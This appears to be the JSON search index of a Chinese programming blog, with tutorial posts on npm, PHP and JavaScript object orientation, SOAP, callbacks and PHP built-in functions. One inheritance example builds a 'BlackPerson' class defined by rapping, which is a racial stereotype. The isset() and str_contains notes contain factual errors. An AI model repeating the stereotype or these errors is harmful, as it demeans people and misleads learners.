\"left-pad\": \"^1.3.0\" }, \"devDependencies\": {}, \"scripts\": { \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\" }, \"author\": \"\", \"license\": \"ISC\"} 就是 dependencies 跟 devDependencies 這兩個 key 的內容，後者是只有在「開發環境中」才使用的套件。 所以人家拿到一個專案，只要看這個檔案就可以知道需要安裝哪些相依套件才能運行。這部分 npm 也幫你想好了，只要執行： 1npm install 就會自動根據 package.json 的內容把所有需要的套件都幫你下載下來。 關於 node_modules這個資料夾就是放一個專案裡安裝的所有「套件」，所以它的容量通常還蠻大的，一般會把它加到 .gitignore 裡面。 要安裝套件的話只需要參考 package.json 就可以了。 npm install 的兩個參數npm install --save 把安裝的套件記錄到 dependencies 裡面（現在變成預設行為，所以不加也沒關係） npm install --save-dev 把安裝的套件記錄到 devDependencies，代表這是只有開發才會用到的套件","link":"/2021/12/23/npm-knowledge/"},{"title":"怎麼用 NPM 的 scripts 指令來自定義指令","text":"教你怎麼寫指令來節省時間。 每一次用 Hexo 要部屬的時候都要先 hexo clean -&gt; hexo generate -&gt; hexo deploy 很煩。雖然也可以用 hexo c 之類的縮寫指令，但身為懶人還是覺得很麻煩。 這時我突然想起來以前有看過 npm 可以自訂義指令，大概是像這樣： 123456\"scripts\": { \"build\": \"hexo generate\", \"clean\": \"hexo clean\", \"deploy\": \"hexo deploy\", \"server\": \"hexo server\",} 然而這些指令可以在濃縮成一個指令，像這樣： 12345\"scripts\": { \"build\": \"hexo generate\", \"clean\": \"hexo clean\", \"deploy\": \"hexo deploy\", \"go\": \"npm run clean &amp;&amp; npm run build &amp;&amp; npm run deploy\" 接著只要 npm run go，就完成 build、clean、deploy 這三個動作了。（這篇文章就是這用這招來部屬的，讚吧） 參考資料讓我們先轉個 180 度：Node.js 與 npm","link":"/2021/12/11/npm-script/"},{"title":"把數字轉字串的三種方法","text":"如題。 數字 + 空字串12const number = 123console.log(number + '') // '123' Number.toString()123const number = 123const result = number.toString()console.log(result) // '123' 注意，一定要搭配 變數 來使用，如果你直接 123.toString() 是沒有用的。 String()最直覺的方法： 123const number = 123const result = String(number)console.log(result) // '123'","link":"/2021/12/20/number-to-string/"},{"title":"從 PHP 再探物件導向","text":"也是花了點時間來筆記。 簡述物件導向有幾個原則，基本上可以分成這四點： Class 類別 Instance 實體 Encapsulation 封裝 Inheritance 繼承 由於 PHP 的物件導向概念比 JavaScript 更完整一些，所以等一下的範例都會以 PHP 為主。 Class / Instance 類別和實體物件導向最基本的概念就是由「Class」和「Insatnce」來組成。 簡單來說，Class 可以想成是「模板（設計圖），而 Instance 則是「實際做出來的東西（成品）」。 在物件導向裡面你一定會很常聽到這句話： new 一個 Instance 出來 這句話比較完整的意思是「從 Class 來 new 出一個 Instance」。 來看個例子： 1234567891011class Dog { function __construct ($name) { $this-&gt;name = $name; } function sayHello () { echo \"Hello~~~\"; }}$dog1 = new Dog('PeaNu');$dog1-&gt;sayHello(); 這邊的 Class 就是設計圖，我希望透過 Class 生出來的 instance 具備 $name 和 sayHello 這兩東西。 接著就用 new 來生出一個 dog1，所以現在就有了新的 instance，它有名字，也會說哈囉。 Encapsulation 封裝 比較複雜的邏輯留在 Class 裡面，自己決定要對外開放哪些 methods 簡單來說，有些時候我們可能會在 Class 裡寫一些單純用來協助程式運作的函式或變數，跟實際使用上沒有太大關聯。這時候就會利用「封裝」的概念來做一點限制，讓 instance 沒辦法直接存取這些函式或變數。 封裝的實作是透過 public 和 private 來把要對內 / 對外的東西來做區隔。 123456789101112class Person { private function get_greeting_sentence () { return 'Hello'; } public function greeting () { echo $this-&gt;get_greeting_sentence(); }}$person1 = new Person();$person1-&gt;greeting();$person1-&gt;get_greeting_sentence(); // fatal error 外面的 instance 不必知道 greeting() 是怎麼實作的，只要知道有這個方法可以用就好了。就算真的它知道裡面是用 get_greeting_sentence 來實作的，也沒有辦法直接去存取它，因為它被歸類成 private 的內容。 總而言之，封裝就是像這樣透過 public 和 private 來做區隔，優點是結構比較明確，或者是能防止別人亂改 Class 裡的資訊。 還是想存取的話怎麼辦？利用 getter 和 setter剛剛有提到 Class 中可能會用變數來儲存一些資訊，但如果 instance 完全沒辦法存取到的話會有點麻煩，來看個例子： 12345678910class Dog { private $name = 'default'; public function say_hello () { echo \"Hello my name is $this-&gt;name\"; }}$dog1 = new Dog();$dog1-&gt;name = 'peanu'; //Fatal error: Uncaught Error: Cannot access private property$dog1-&gt;say_hello(); 因為 $name 是 private 資訊，所以存取的時候就會噴 Error。可是我們就是希望可以自己設定 $name 的話怎麼辦？ 這時候會用到兩個東西：getter 和 setter getter 是用來讀取 Class 中的資訊 setter 是用來設定 Class 中的資訊 簡單來說就是你可以對外 public 兩個函式，一個專門讀取資訊，一個專門設定資訊，這樣不就好了嗎？ 來把剛剛的例子做點修改： 123456789101112131415161718class Dog { private $name = 'default'; public function set_name ($name) { // 不雅名稱 if ($name === 'fuck') return; // 設值 $this-&gt;name = $name; } public function get_name () { echo $this-&gt;name; }}$dog1-&gt;set_name('fuck');$dog1-&gt;get_name(); // default$dog1-&gt;set_name('peanu');$dog1-&gt;get_name(); // peanu 有了 setter 和 getter 以後就能達到我們的目的。除此之外，還可以在裡面做一些限制，例如說不可以取髒話啦，或者是只能讀取到哪些內容，這些都是可以透過 getter 和 setter 來設計的。 Inheritance 繼承 就如同字面意思，繼承某個 Class 舉例來說，假設你有一個狗的 Class，它有名字，還會打招呼。現在你希望在多一個 Class 是黑狗，它跟狗有 87 分像，只差在多了跑步這個功能，那你有可能會這樣寫： 1234567891011121314151617181920212223242526// 狗class Dog { function __construct ($name) { $this-&gt;name = $name; } public function say_hello () { echo \"Hello my name is \" . $this-&gt;name; }}// 黑狗class BlackDog { function __construct ($name) { $this-&gt;name = $name; } public function say_hello () { echo \"Hello my name is \" . $this-&gt;name; } public function run () { echo \"Yo! I am running\"; }}$dog = new Dog('dog');$black_dog = new BlackDog('black dog');$dog-&gt;say_hello(); // Hello my name is dog$black_dog-&gt;say_hello(); // Hello my name is black dog$black_dog-&gt;run(); // Yo! I am running 雖然沒什麼問題，但在工程師的世界不是有句名言嗎： DRY（Don’t Repeat Yourself） 既然它們都是「狗」，而黑狗只是多了跑步這個功能，那幹嘛不直接讓它「繼承」狗就好？就跟現實中的小孩會繼承父母 DNA 是一樣的感覺。 所以呢，在大部分物件導向的語言裡會提供一個東西叫做 extends，讓你可以繼承某個 class，這樣就不必再重複寫一遍。 一樣來改一下剛剛的例子： 12345678910111213141516171819class Dog { function __construct ($name) { $this-&gt;name = $name; } public function say_hello () { echo \"Hello my name is \" . $this-&gt;name; }}// 繼承狗的 Classclass BlackDog extends Dog { public function run () { echo \"Yo! I am running\"; }}$dog = new Dog('dog');$black_dog = new BlackDog('black dog');$dog-&gt;say_hello(); // Hello my name is dog$black_dog-&gt;say_hello(); // Hello my name is black dog$black_dog-&gt;run(); // Yo! I am running 以上就是繼承最基本的用法，接著來介紹幾個使用繼承時可能會碰到的問題。 想要覆寫原本 Class 的 method其實還蠻直覺的，如果想要覆寫的話，就直接在「繼承的 Class」裡寫一個一模一樣的來蓋掉就好，跟你寫 CSS 的概念有點像： 123456789101112131415161718192021class Dog { function __construct ($name) { $this-&gt;name = $name; } public function say_hello () { echo \"Hello my name is\" . $this-&gt;name; }}class BlackDog extends Dog { // 直接寫一樣的來覆蓋 public function say_hello() { echo \"yoyoyo black dog is better\"; } public function run () { echo \"Yo! I am running\"; }}$dog = new Dog('dog');$black_dog = new BlackDog('black dog');$dog-&gt;say_hello(); // Hello my name is dog$black_dog-&gt;say_hello(); // yoyoyo black dog is better 想要存取原本 Class 的 private 變數如果你在「繼承的 Class」中存取原本的 private 變數，就會發現存取不了： 123456789101112131415class Dog { private $test = 'yo'; public function log_private() { echo $this-&gt;test; }}class BlackDog extends Dog { public function log_private() { echo $this-&gt;test; }}$dog = new Dog();$black_dog = new BlackDog();$dog-&gt;log_private(); // yo$black_dog-&gt;log_private(); // Warning: Undefined property: BlackDog::$test 所以要改用 protected 來設定才行： 12345678910111213141516class Dog { // 從 private 改成 protected protected $test = 'yo'; public function log_private() { echo $this-&gt;test; }}class BlackDog extends Dog { public function log_private() { echo $this-&gt;test; }}$dog = new Dog();$black_dog = new BlackDog();$dog-&gt;log_private(); // yo$black_dog-&gt;log_private(); // yo protected 一樣沒辦法讓外面的 instance 存取，但是繼承的 Class 可以存取。 想要存取原本 Class 的 method有兩種方法： 透過 $this-&gt;method 透過 parent::method 123456789101112131415161718class Dog { public function say_hi() { echo 'hi'; }}class BlackDog extends Dog { public function say_yo_and_hi_1 () { echo 'yo'; $this-&gt;say_hi(); } public function say_yo_and_hi_2 () { echo 'yo'; parent::say_hi(); }}$black_dog = new BlackDog();$black_dog-&gt;say_yo_and_hi_1(); // yohi$black_dog-&gt;say_yo_and_hi_2(); // yohi 實際差別我不是很清楚，但比較常見的做法會是第二種，詳細可以參考這篇：multiple ways of calling parent method in php。 順便附個 JS 的寫法，其實就是把 parent:: 改成 super： 123456789101112131415class Parent { sayHi () { console.log('hi'); }}class Child extends Parent { sayHiAndYo () { console.log('yo'); super.sayHi(); }}const c2 = new Child();c2.sayHiAndYo(); // yo hi 關於 static前面已經介紹過三種在 Class 設定的變數和函式： public private protected 最後要來介紹一個東西，叫做 static。 簡單來說，透過前面那三種設定的資訊會綁在 instance 身上，不是 Class。 用講的有點難懂，來舉個例子： 123456789class V1 { public $name = 'PPB';}$a = new V1();$b = new V1();echo $a-&gt;name; // PPBecho $b-&gt;name; // PPB 僅管這兩個 instance 的 $name 看起來好像一樣，但其實這兩個$name 是不同的變數。也就是說你有幾個 instance ，就會有幾個 $name 這個變數。 但如果你用 static 來設定就不一樣了： 1234class V1 { static $name = 'PPB';}echo V1::$name; static 的意思是說： 我要把這個變數 or 函式綁在這個 Class 身上。 所以要存取的話也得透過 Class，而不是 instance，可以想成是一種全域變數的感覺，因為每一個 instance 都會共用同個變數。 就如同 static 的字面意思，它是「靜態」的，所以一般是用在「你不會去改變的變數或函式」。","link":"/2022/03/19/oop-by-php/"},{"title":"物件導向之繼承","text":"如題。 簡述簡單來說就是「繼承某個 class 的屬性和方法」。 假設我有一個 Person 的 class，會有名稱和年齡，然後會打招呼。 1234567891011class Person { constructor (name, age) { this.name = name; this.age = age; } log () { console.log(this.name + ', ' + this.age); }}const peanu = new Person('peanu', 23);peanu.log(); // peanu, 23 現在我希望有一個黑人，一樣具備 Person 的特性（名稱、年齡、打招呼），但要多一項技能是「唱 Rap」，這時候就應該利用「繼承」的方式來建立，而不是重新寫一個幾乎相同的 class 12345678class BlackPerson extends Person { rap() { console.log('yoyoyo my name is ' + this.name); }}const blackMan = new BlackPerson('blackMan', 30);blackMan.log(); // blackMan, 30blackMan.rap(); // yoyoyo my name is blackMan 注意，這裡用了 extends 來繼承 Person 的資訊，所以即便 BlackPerson 中沒有寫 constructor，也一樣具備 name 和 age 這兩個屬性，而且也可以用 log 方法。 除了繼承以外，我們也幫它加了一個 rap 方法。所以只要是從 BlackPerson 生出來的 instance，都會具備 rap 的能力。 如果我想在繼承的 class 上使用 constructor 怎麼辦？以剛剛的例子來說，如果我希望幫 BlackPerson 加上性別，我可能直覺會這樣寫： 12345678910111213class BlackPerson extends Person { constructor (gender) { // 加上一個新的 gender 屬性 this.gender = gender; } rap () { console.log('yoyoyo my name is ' + this.name + ', and my gender is ' + this.gender); }}// 建立 instanceconst blackMan = new BlackPerson('blackMan', 30, 'man');// 預期：yoyoyo my name is blackMan, and my gender is manblackMan.rap(); 但這樣會得到錯誤： 12ReferenceError: Must call super constructor in derived class before accessing 'this' or returning from derived constructor 簡單來說，要在繼承的 class 上設定 constructor 之前，得先呼叫 super 這個 function。先執行原本 Person 的 constructor，接著再執行 BlackPerson 的 constructor，所以應該要這樣寫： 123456789101112131415class BlackPerson extends Person { constructor (name, age, gender) { // 呼叫 super 並傳入參數 super(name, age); // super 執行完後才建立新的 gender this.gender = gender; } rap () { console.log('yoyoyo my name is ' + this.name + ', and my gender is ' + this.gender); }}// 建立 instanceconst blackMan = new BlackPerson('blackMan', 30, 'man');// yoyoyo my name is blackMan, and my gender is manblackMan.rap(); 總而言之，一定要記得先執行 super，這樣才不會出錯。","link":"/2022/03/18/oop-extends/"},{"title":"SOAP 另一種跟伺服器溝通的協議","text":"了解一下。 概論SOAP（Simple Object Access Protocol） 首先，SOAP 都是基於「XML」來做資料交換（溝通），所以如果你要跟一個提供 SOAP 服務的伺服器溝通，大概會是這樣子： 123456789101112131415&lt;!-- 用戶端發的 request --&gt;&lt;?xml version=\"1.0\"?&gt; &lt;soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:cal=\"http://www.stgregorioschurchdc.org/Calendar\"&gt; &lt;!-- header --&gt;&lt;soapenv:Header/&gt; &lt;!-- body --&gt;&lt;soapenv:Body&gt; &lt;cal:easter_date soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"&gt; &lt;year xsi:type=\"xsd:short\"&gt;2014&lt;/year&gt; &lt;/cal:easter_date&gt; &lt;/soapenv:Body&gt; &lt;/soapenv:Envelope&gt; 123456789101112131415&lt;!-- 伺服端回傳的 response --&gt;&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\"xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"&gt;&lt;!-- body --&gt;&lt;SOAP-ENV:Body&gt; &lt;namesp1:easter_dateResponse xmlns:namesp1=\"http://www.stgregorioschurchdc.org/Calendar\"&gt; &lt;s-gensym3 xsi:type=\"xsd:string\"&gt;2014/04/20&lt;/s-gensym3&gt;&lt;/namesp1:easter_dateResponse&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt; 其實就跟 HTTP 的概念很類似，只是都改成用 XML 的資料格式來做溝通。","link":"/2022/01/05/other-protocol-soap/"},{"title":"把 function 當作參數","text":"一個會讓人想很久的觀念。 重新認識參數這種把 function 當作參數的用法最常用在 callback function，也可以翻作「回調函式」。 我覺得 callback function 可以當作是轉職任務的關卡吧，如果你能理解這個概念的話，就像是從盜賊轉職成刺客了的概念（到底在說什麼 XD） 但在學 callback function 之前得先弄懂這個概念，所以一步一步來就好，從我們最熟悉的情況開始： 1234function print(anything) { console.log(anything)}print(123) 乍看之下沒有什麼，print(123) 執行後就會印出 123。 現在讓我們在加一個新的 function，然後試著把它當作參數（anything）傳進去： 1234567function print(anything) { console.log(anything)}function hello() { console.log('hello')}print(hello) 之後我們會得到 [Function: hello] 這個結果，其實仔細想想的話也很合理，因為我們就是丟一個 function 進去，所以它 log 出來當然是跟我說「anything 的值是 hello 這個 function」 那我們如果想要執行 hello 這個 function 的話呢？ 其實也沒有什麼困難的，既然現在 anything 代表的就是 hello，那我們就用 anything() 來執行就好了呀！ 1234567function print(anything) { anything()}function hello() { console.log('hello')}print(hello) // hello 把 function 當作參數的最基本的概念就是這樣而已，這個一定要理解。 稍微複雜一點的例子如果要你實作下面這個 function，你會怎麼做？ 1function doSomething([1, 2, 3]) =&gt; [2, 4, 6] 我自己覺得比較直覺的作法是這樣： 1234567891011function doSometing(array) { var result = [] for (var i=0; i&lt;array.length; i++) { result.push(double(array[i])) } return result}function double(num) { return num * 2}console.log(doSometing([1, 2, 3])) // [2, 4, 6] 但如果現在題目變成這樣呢？ 1function doSomething([1, 2, 3], Afunction) =&gt; [2, 4, 6] 按照前面所學，現在會多一個 Afunction 參數，所以得傳入一個 function 進去： 1234567891011function doSometing(array, Afunction) { var result = [] for (var i=0; i&lt;array.length; i++) { result.push(Afunction(array[i])) } return result}function double(num) { return num * 2}console.log(doSometing([1, 2, 3], double)) // [2, 4, 6] 不知道你有沒有發現，這跟第一題根本差不多嘛，只是一個是在 doSometing 裡面去呼叫外面的 double ，一個是直接把 double 傳進去 doSometing。 所以這兩個有什麼差嗎？不都解的出來？ 別急，想想看如果現在題目又變了，變成這樣： 1function doSomething([1, 2, 3], Afunction) =&gt; [3, 6, 9] 如果是用第一種作法的話，應該會做這樣的調整： 1234567891011function doSometing(array) { var result = [] for (var i=0; i&lt;array.length; i++) { result.push(triple(array[i])) } return result}function triple(num) { return num * 3}console.log(doSometing([1, 2, 3])) // [2, 4, 6] 為了符合語意，你會先把 double 改名成 triple 修改 triple 中的內容 那如果是第二種做法呢？ 1234567891011function doSometing(array, Afunction) { var result = [] for (var i=0; i&lt;array.length; i++) { result.push(Afunction(array[i])) } return result}function triple(num) { return num * 3}console.log(doSometing([1, 2, 3], triple)) // [2, 4, 6] 嗯…好像也差不多？但在你扁我之前，請你先回憶一下「函式的宣告方式」，想一下下面的程式碼是不是也合理： 123456789101112function doSometing(array, Afunction) { var result = [] for (var i=0; i&lt;array.length; i++) { result.push(Afunction(array[i])) } return result}var triple = function (num) { return num * 3}console.log(doSometing([1, 2, 3], triple)) // [2, 4, 6] 那如果我再改成這樣呢？ 12345678910function doSometing(array, Afunction) { var result = [] for (var i=0; i&lt;array.length; i++) { result.push(Afunction(array[i])) } return result}console.log(doSometing([1, 2, 3], function (num) { return num * 3})) // [2, 4, 6] 哦哦哦哦！你發現了嗎？當我們把函式當作參數傳入時，除了傳入一個「命名函式」之外，我們也可以傳入一個「匿名函式」來做處理。也就是說，不管我們想讓這個函式做什麼，我們都不用擔心語意的問題！ 為什麼需要把 function 當作參數？其實前面的例子，就算不把 function 當作參數也能解出來，所以可能體會不到為什麼需要這樣的做法。 但我覺得把 function 當作參數的一個想法是：你還不確定這個 function 要做什麼。 以前面的例子來說，可以想成是這樣： 在我們實作 doSometing 時，可能會想要用一個 function 來做一段處理，所以就用 Afunction 來表示。只是我們實際要用它來做什麼還不知道，唯一知道的是 Afunction 會接受一個參數 Afunctuin(array[i])。但不論這個 Afunctuin 要實作的內容是什麼，都跟 doSometing 無關。 至於最後在傳入的時候該用「命名函式」還是「匿名函式」比較好？其實沒有正確的答案，這要看你考慮的是什麼。 像命名函式的好處是可讀性比較好，匿名函式的好處是彈性空間比較大，兩者各有優缺點。","link":"/2021/12/18/pass-function-into-function/"},{"title":"PHP 在 function 中存取全域變數","text":"還蠻特別的。 簡述PHP 跟 JavaScript 一樣有全域變數跟區域變數，條件也很類似： 宣告在 function 裡面的 = 區域變數，只能在 functino 裡面存取，functino 結束後就摧毀。 宣告在 function 外面的 = 全域變數，可以在整個 script 裡存取，離開 script 就被摧毀。 跟 JavaScript 不同的地方在於 function 無法直接存取全域變數，必須先做一個動作，看範例： 1234567&lt;?php $globalA = 'A'; function local() { echo $globalA; // Warning: Undefined variable $globalA } local()?&gt; 正確的做法： 12345678&lt;?php $globalA = 'A'; function local() { global $globalA; echo $globalA; // 'A' } local()?&gt; 要在 function 內存取全域變數，必須先用 global 來宣告才可以用。","link":"/2022/02/07/php-access-global-var-in-function/"},{"title":"PHP 基礎","text":"終於呀。 簡述 XAMPP網址路徑 = 檔案路徑 根路徑是 htdocs 這個資料夾 資料夾結構： 12345htdocs └── dashboard ├── index.html 預設的首頁 └── peanu ├── a.php 新建的檔案 所以要看 htdocs/peanu/a.php 的輸出結果就要在網址輸入 http://localhost/peanu/a.php 幾個從 JavaScript 跳到 PHP 要改掉的習慣 該加上 ; 的地方一定要加 變數會用 $ 這個前綴表示 字串拼接是用 . 不是 + 哦，+ 在 PHP 是代表加法 不要懷念 console.log，現在變成 echo 或 print_r() 基本語法一些小提醒 要寫 PHP 的語法，就一定要寫在 &lt;?php?&gt; 裡面： 12345&lt;?php for ($i=0; $i&lt;=10; $i++) { echo $i; }?&gt; 沒有寫在 &lt;?php?&gt; 中的內容可以是「純文字」或「HTML」： 12345670123&lt;br&gt;&lt;?php for ($i=0; $i&lt;=10; $i++) { echo $i; }?&gt;&lt;h1&gt;yoyoyo&lt;/h1&gt; 不可以在 &lt;?php?&gt; 寫 HTML 的語法，得寫成純文字： 1234&lt;?php echo '&lt;h1&gt;Correct&lt;/h1&gt;'; echo &lt;h1&gt;Wroing&lt;/h1&gt;;?&gt; 印出內容 echo123&lt;?php echo 'Hello I\\'m PeaNu yoyo!'?&gt; 宣告變數 $備註：要用變數的時候也要加上 $ 1234&lt;?php $name = 'PeaNu'; echo 'Hi ,' . $name ;?&gt; 字串拼接 .123&lt;?php echo 'String' . ' ' . 'Concatenation';?&gt; if 判斷式就跟寫 JavaScript 差不多： 12345678&lt;?php $score = 50; if ($score &gt;= 60) { echo 'Pass'; } else { echo 'Fail'; }?&gt; for 迴圈其他迴圈也是以此類推： 12345&lt;?php for ($i=0; $i&lt;10; $i++) { echo $i . '&lt;br&gt;'; }?&gt; Array用 array() 建立，找長度用 sizeof()： 12345678910&lt;?php $arr = array(1, 2, 3); for ($i=0; $i&lt;sizeof($arr); $i++) { echo $arr[$i] . '&lt;br&gt;'; } // print_r($array); /* for ($i=0; $i&lt;$sizeof($array); $i++) { echo $array[$i]; } */?&gt; function123456&lt;?php function add($a, $b) { return $a + $b; } echo add(1, 3);?&gt; 印出比較複雜的資料結構像 Array 不能直接 echo，可以用 var_dump()： 1234&lt;?php $arr = array(1, 2, 3, 'A', true); var_dump($arr)?&gt; 1234567array(5) { [0]=&gt; int(1) [1]=&gt; int(2) [2]=&gt; int(3) [3]=&gt; string(1) \"A\" [4]=&gt; bool(true) } 會印出很完整的資訊，有 type、length、value 或者是比較簡潔一點的 print_f()： 1234&lt;?php $arr = array(1, 2, 3, 'A', true); print_r($arr);?&gt; 1234567Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; A [4] =&gt; 1 )","link":"/2022/01/30/php-basic/"},{"title":"用 PHP 做一個最基本的 API","text":"實際做之後才發現沒那麼複雜。 簡述如果想要回傳一個 JSON 格式的資料，在 PHP 只要做兩件事就好： 用 array 建立好 JSON 格式的物件 用 PHP 的內建方法 json_encode 編碼成 JSON 資料 就是這麼簡單，附個範例： 123456789101112131415161718// 最好是加上這個 header，不然會被當成 HTML 或純文字（text/html）header('Content-type: application/json; charset=utf-8'); $users = array(); // 隨便產生的資料 for ($i=0; $i&lt;5; $i++) { array_push($users, array( \"id\" =&gt; $i, \"name\" =&gt; \"PeaNu\", \"age\" =&gt; '1' . $i, \"created_at\" =&gt; date('Y-m-d-H-i-s') )); } // 在包裝成一個物件 $json = array(\"users\" =&gt; $users); // JSON 編碼 $response = json_encode($json); // 回傳 JSON 資料 echo $response; 結果長這樣： 延伸範例如果你還記得留言版的話，會發現資料庫撈出來的資料只要先轉成 JSON，就可以當作是一支 API 了。 取得所有留言的 API： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?php // 連線資料庫 require_once('./conn.php'); // 分頁功能 $limit = 10; $offset = 0; // 分頁參數 if (!empty($_GET['limit'])) { $limit = intval($_GET['limit']); } if (!empty($_GET['offset'])) { $offset = intval($_GET['offset']); } // SQL 指令 $sql = \"SELECT users.username, users.nickname, comments.content, comments.created_at, comments.id, comments.is_deleted FROM comments LEFT JOIN users ON comments.username=users.username WHERE comments.is_deleted IS null ORDER BY comments.id DESC LIMIT ? OFFSET ?\"; $stmt = $conn-&gt;prepare($sql); $stmt-&gt;bind_param('ii', $limit, $offset); $result = $stmt-&gt;execute(); if (!$result) { die('執行失敗，' . $conn-&gt;error); } $result = $stmt-&gt;get_result(); // 產生留言資料（陣列包物件） $comments = array(); while ($row = $result-&gt;fetch_assoc()) { array_push($comments, array( \"id\" =&gt; $row['id'], \"username\" =&gt; $row['username'], \"nickname\" =&gt; $row['nickname'], \"content\" =&gt; $row['content'], \"created_at\" =&gt; $row['created_at'] ) ); } // 最外層在包成物件 $json = array( \"comments\" =&gt; $comments ); // JSON 編碼 $response = json_encode($json); // 設定資料格式 header('Content-type: application/json;charset=utf-8'); // 回傳 echo $response;?&gt; 結果長這樣： 其實也沒有很複雜，就只是把網頁的「純資料」抽出來而已。","link":"/2022/02/15/php-built-an-api/"},{"title":"PHP 中常用的內建函式與變數","text":"懶人包。 列表phpinfo() 打開後瀏覽器後會顯示 PHP 版本資訊： 1phpinfo() $conn-&gt;insert_id 取得上一筆 auto_increment 產生的 id 值 1234567$name = 'PeaNu';$sql = \"INSERT INTO users(name) VALUES(?)\";$stmt = $conn-&gt;prepare($sql);$stmt-&gt;bind_param('s', $name);$stmt-&gt;execute();// 這邊會自動去抓上一筆 auto_increment 產生的 id 值echo '上一筆新增的 id 值為' . $conn-&gt;insert_id; var_dump(variable) 可以查看比較複雜的資料結構，或者是 function 的回傳值。 查看 Array 的值： 123456789&lt;?php$arrayLike = array( 'name' =&gt; 'PeaNu', 'age' =&gt; 20, 'isMarry' =&gt; true );var_dump($arrayLike); ?&gt; Output： 1array(3) { [\"name\"]=&gt; string(5) \"PeaNu\" [\"age\"]=&gt; int(20) [\"isMarry\"]=&gt; bool(true) } 查看 isset() 的回傳值： 1234&lt;?php$test;var_dump(isset($test)); // bool(false) ?&gt; isset(variable) 如果變數沒有值或值是 null 就回傳 true，不然回傳 false。 備註：這個判斷機制跟 JS 不太一樣，空字串不是 null 所以會回傳 true 不是 false。 123456789&lt;?php$test1 = null;$test2 = '';$test3;var_dump(isset($test1)); // bool(false) var_dump(isset($test2)); // bool(true) var_dump(isset($test3)); // bool(false) ?&gt; empty(expression) 檢查是不是空值（Null、空字串、0）： 1234567&lt;?phpvar_dump(empty('')); // bool(true)var_dump(empty('123')); // bool(false)var_dump(empty(null)); // bool(true)var_dump(empty(1+1)); // bool(false)var_dump(empty(0)); // bool(true)?&gt; print_f(variable) 可以看變數的值，比 var_dump 簡潔一點： 1234&lt;?php$likeObject = array('name' =&gt; 'PeaNu', 'age' =&gt; 20);print_r($likeObject);?&gt; 1Array ( [name] =&gt; PeaNu [age] =&gt; 20 ) exit('...') die('...') 輸出訊息後退出（跟 return 很類似）： 12345678910&lt;?phpif ($_GET['username'] &amp;&amp; $_GET['age']) { echo 'Hello ' . $_GET['username'] . '&lt;br&gt;'; echo 'Your age is ' . $_GET['age'] . '&lt;br&gt;'; // 改成 die() 也可以 exit('this is the end.');}echo '資料有缺，請重新輸入。' . '&lt;br&gt;';?&gt; gettype(data) 查看資料型態 123456&lt;?phpecho gettype(0); // integerecho gettype(null); // NULLecho gettype(true); // booleanecho gettype('yoyoyo'); // string?&gt; sprintf() 格式化字串，可以想成是 template string 的概念。 123$format = 'PeaNu has %d dollars and \"%s\" .';echo sprintf($format, 100, 'MUCH MORE');// PeaNu has 100 dollars and \"MUCH MORE\" . header() 設定 resonse header 的值 12// 代表重新導向到 index.php 的位置header('Location: index.php'); http_response_code() 設定 HTTP status code： 12// 回傳 422http_response_code(422); require_once('file.php') 把檔案引入，已經有引入過的話就不會重複引入 1require_once('index.php'); time() 取得從 1970 到現在的時間（秒數） 1time() // 1644216655 setcookie($key, $value, $expire) 設定 cookie 內容 123// 30 days$expire = time() + 3600 * 24 * 30;setcookie('username', 'PeaNu', $expire); date($formate) 格式化輸出日期 格式表：date_format 1echo date('Y-m-d-H-i-s'); // 2022-02-07-07-56-58 getrandmax() 取得 rand 能產生的最大值 1echo getrandmax(); // 2147483647 rand($min, $max) 產生亂數，可指定範圍。沒有指定的話就會從 0 ~ 2147483647： 1echo rand(10, 15); // [10 ~ 15]（閉區間） chr($ascii) 根據 ascii 碼來輸出字串 12echo chr(65); // Aecho chr(65+25); // Z ord($string) 回傳字串的 ascii 碼 12echo ord('a'); // 97echo ord('A'); // 65 password_hash($password, format) 內建的雜湊函式，前面填明碼，後面填雜湊的演算法： 1234&lt;?php echo password_hash('abcdefg', PASSWORD_DEFAULT); // $2y$10$ZBGKjZ4nxWWJRKgUcJ8X3.HdJOlAf0JvCK5R4G6M8KXZr52baItJO?&gt; password_verify($password, hash) 用雜湊值檢查密碼是否正確： 12345678910&lt;?php var_dump(password_verify( 'abcdefg', '$2y$10$ZBGKjZ4nxWWJRKgUcJ8X3.HdJOlAf0JvCK5R4G6M8KXZr52baItJO') ); // true var_dump(password_verify( 'aaaabcdefg', '$2y$10$ZBGKjZ4nxWWJRKgUcJ8X3.HdJOlAf0JvCK5R4G6M8KXZr52baItJO') ); // false?&gt; htmlspecialchars($string, option) 把輸入的字串做跳脫 備註：要注意丟進去的資料都會被轉成「字串」回傳 12345678/* option: ENT_COMPAT: 預設，只轉換雙引號，不轉換單引號 ENT_QUOTES：雙引號與單引號都要轉換 ENT_NOQUOTES：單引號與雙引號都不轉換。*/echo htmlspecialchars('&lt;script&gt;alert(\"yoyoyo\")&lt;/script&gt;', ENT_QUOTES);// &lt;script&gt;alert(\"yoyoyo\")&lt;/script&gt; （純文字） strlen 回傳字串長度 1echo strlen('some text'); // 9 strtolower 轉小寫 1echo strtolower('ABC'); // abc strtoupper 轉大寫 1echo strtoupper('abc'); // ABC str_contains($string, $search) 字串裡有沒有包含某段字（有分大小寫） 附註：這個是 PHP 8 推出的，所以要特別注意。替代方案可以參考 Stack overflow 12var_dump(str_contains('abc', 'a')); // bool(true)var_dump(str_contains('abc', 'A')); // bool(true) str_replace($replace, $newString, $string) 替換字串 附註：跟 JS 不一樣，這會把所有符合的字都換掉 1234&lt;?php $str = 'yoyoyoyooooyoyyyo'; echo str_replace('y', 'Y' , $str); // YoYoYoYooooYoYYYo?&gt; explode($separator) 跟 JS 的 split() 一樣，回傳值也是陣列。 1234$date = '2022-02-17 